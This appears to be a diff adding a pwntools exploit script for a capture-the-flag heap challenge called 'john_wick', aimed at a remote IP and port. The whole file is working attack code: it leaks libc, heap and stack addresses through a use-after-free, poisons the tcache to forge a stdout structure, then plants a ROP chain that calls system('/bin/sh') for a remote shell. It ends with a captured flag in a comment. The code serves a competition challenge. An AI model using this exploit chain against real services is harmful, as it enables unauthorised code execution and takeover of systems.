@@ -1,0 +1,127 @@
+from pwn import *
+
+e = ELF("./john_wick_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-2.39.so")
+
+'''
+'''
+
+script = '''
+breakrva 0x1C45
+'''
+
+def add(index, name, age, height, des_len, des, coin):
+    p.sendafter(b"6. Exit\n> ", b"1")
+    p.sendafter(b"Index: ", f"{index}".encode())
+    p.sendafter(b"Name: ", name)
+    p.sendafter(b"Age: ", f"{age}".encode())
+    p.sendafter(b"Height (cm): ", f"{height}".encode())
+    p.sendafter(b"Length of description: ", f"{des_len}".encode())
+    if(des_len <= 0x100):
+        p.sendafter(b"Description: ", des)
+        p.sendlineafter(b"coin = 6M$): ", f"{coin}".encode())
+
+def delete(index):
+    p.sendafter(b"6. Exit\n> ", b"2")
+    p.sendafter(b"Index: ", f"{index}".encode())
+    
+def view(index):
+    p.sendafter(b"6. Exit\n> ", b"3")
+    p.sendafter(b"Index: ", f"{index}".encode())
+
+def change(index, status):
+    p.sendafter(b"6. Exit\n> ", b"4")
+    p.sendafter(b"Index: ", f"{index}".encode())
+    p.sendlineafter(b"New status: ", status)
+
+def edit(index, des):
+    p.sendafter(b"6. Exit\n> ", b"5")
+    p.sendafter(b"Index: ", f"{index}".encode())
+    p.sendafter(b"New description: ", des)
+
+p = remote("103.69.97.144", 6121)
+#p = process("./john_wick_patched")
+#p = gdb.debug("./john_wick_patched", gdbscript = script)
+
+# leak libc
+for i in range(9):
+    add(i, b"A" * 8, 1, 2, 0x87 , b"B" * 0x10, 0xffff)
+for i in range(8, 1, -1):
+    delete(i)
+delete(0)
+change(1, b"X" * 32)
+view(1)
+p.recvuntil(b"Description: ")
+libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x203b20
+__environ = libc_base + libc.symbols['__environ']
+stdout = libc_base + libc.symbols['_IO_2_1_stdout_']
+
+# leak heap
+add(0, b"A" * 8, 1, 2, 0x67 , b"B" * 0x10, 0xffff)
+for i in range(2, 9):
+    add(i, b"A" * 8, 1, 2, 0x67 , b"B" * 0x10, 0xffff)
+for i in range(8, 1, -1):
+    delete(i)
+delete(0)
+view(1)
+p.recvuntil(b"Description: ")
+heap_base = u64(p.recv(5).ljust(8, b"\x00")) << 12
+
+print(hex(libc_base))
+print(hex(heap_base))
+print(hex(__environ))
+
+# tcache poisoning to stdout
+for i in range(2, 9):
+    add(i, b"A" * 8, 1, 2, 0x67 , b"B" * 0x10, 0xffff)
+add(0, b"A" * 8, 1, 2, 0x67 , b"B" * 0x10, 0xffff)
+delete(2)
+delete(0)
+target = (stdout) ^ heap_base >> 12
+edit(1, p64(target)[:-1:])
+add(2, b"A" * 8, 1, 2, 0x67 , b"B" * 0x10, 0xffff)
+
+# leak stack
+# fakestdout = p64(0x00000000fbad2887) + p64(libc_base + 0x204643) * 7 + p64(libc_base + 0x204643 + 5)
+fakestdout = p64(0x00000000fbad2887) # flag
+fakestdout += p64(0) # read_ptr
+fakestdout += p64(__environ) # read_end
+fakestdout += p64(0) # read_base
+fakestdout += p64(__environ) # write_base
+fakestdout += p64(__environ + 0x100) # write_ptr
+fakestdout += p64(0) # write_end
+fakestdout += p64(0) # buf_base
+fakestdout += p64(0x100) # buf_end
+# add(0, b"A" * 8, 1, 2, 0x67 , fakestdout, 0xffff)
+p.sendafter(b"6. Exit\n> ", b"1")
+p.sendafter(b"Index: ", f"{0}".encode())
+p.sendafter(b"Name: ", b"A" * 8)
+p.sendafter(b"Age: ", f"{1}".encode())
+p.sendafter(b"Height (cm): ", f"{2}".encode())
+p.sendafter(b"Length of description: ", f"{0x67}".encode())
+p.sendafter(b"Description: ", fakestdout)
+rbp = u64(p.recv(6).ljust(8, b"\x00")) - 0x138
+print(hex(rbp))
+p.sendlineafter(b"coin = 6M$): ", f"{0xffff}".encode())
+
+# house of spirit
+delete(3)
+delete(2)
+target = rbp ^ heap_base >> 12
+edit(1, p64(target)[:-1:])
+add(3, b"A" * 8, 1, 2, 0x67 , b"B" * 0x10, 0xffff)
+system = libc_base + libc.symbols['system']
+binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
+pop_rdi = libc_base + 0x000000000010f75b
+ret = pop_rdi + 1
+rop = p64(0) + p64(pop_rdi)
+rop += p64(binsh) + p64(ret)
+rop += p64(system)
+add(2, b"A" * 8, 1, 2, 0x67 , rop, 0xffff)
+
+# trigger rop
+p.sendafter(b"6. Exit\n> ", b"6")
+
+p.interactive()
+#BKSEC{1nt3ger_0v3rfl0w_D8nRCPqVjFBiPRGB2Et7FQukHBFhKQSv}
